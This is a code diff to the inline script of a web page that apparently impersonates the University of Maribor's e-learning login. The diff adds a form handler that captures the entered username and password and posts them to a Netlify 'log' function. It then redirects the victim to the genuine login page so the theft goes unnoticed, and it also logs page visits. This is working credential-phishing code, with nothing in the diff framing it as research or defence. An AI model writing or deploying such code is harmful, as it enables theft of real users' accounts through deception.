@@ -439,32 +439,28 @@
     fetch("/.netlify/functions/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ formSubmitted: false }),
+      body: JSON.stringify({ formSubmitted: null }),
     });
 
-    document
-      .querySelector("#login-form")
-      .addEventListener("submit", function (e) {
-        e.preventDefault();
-        const username = document.querySelector(
-          'input[name="username"]'
-        ).value;
-        const password = document.querySelector(
-          'input[name="password"]'
-        ).value;
+    document.querySelector("#login-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
 
-        fetch("/.netlify/functions/log", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username,
-            password,
-            formSubmitted: true,
-          }),
-        }).then(() => {
-          window.location.href = "https://estudij.um.si/login/index.php";
-        })
+      const formSubmitted = username && password ? true : false;
+
+      fetch("/.netlify/functions/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          formSubmitted,
+          username,
+          password
+        }),
+      }).then(() => {
+        window.location.href = "https://estudij.um.si/login/index.php";
       });
+    });
   </script>
 </body>
 
